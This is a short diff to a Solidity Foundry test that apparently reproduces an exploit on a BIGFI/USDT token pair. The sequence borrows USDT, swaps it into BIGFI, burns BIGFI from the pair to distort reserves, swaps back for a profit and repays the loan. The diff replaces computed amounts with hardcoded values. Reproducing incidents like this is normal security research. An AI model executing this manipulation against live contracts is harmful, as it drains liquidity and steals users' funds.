@@ -250,16 +250,13 @@ contract BIGFITest is Test, BlockLoader {
         vm.startPrank(attacker);
         borrow_usdt_owner(200000e18);
         printBalance("After step0 ");
-        swap_pair_attacker_usdt_bigfi(
-            usdt.balanceOf(attacker),
-            pair.getAmountOut(usdt.balanceOf(attacker), address(usdt))
-        );
+        swap_pair_attacker_usdt_bigfi(200000e18, 6049.946035638727192292e18);
         printBalance("After step1 ");
         burn_bigfi_pair(3260e18);
         printBalance("After step2 ");
         swap_pair_attacker_bigfi_usdt(
-            bigfi.balanceOf(attacker),
-            pair.getAmountOut(bigfi.balanceOf(attacker), address(bigfi))
+            6049.946035638727192292e18,
+            307427.442385714227894965e18
         );
         printBalance("After step3 ");
         payback_usdt_owner(200600e18);
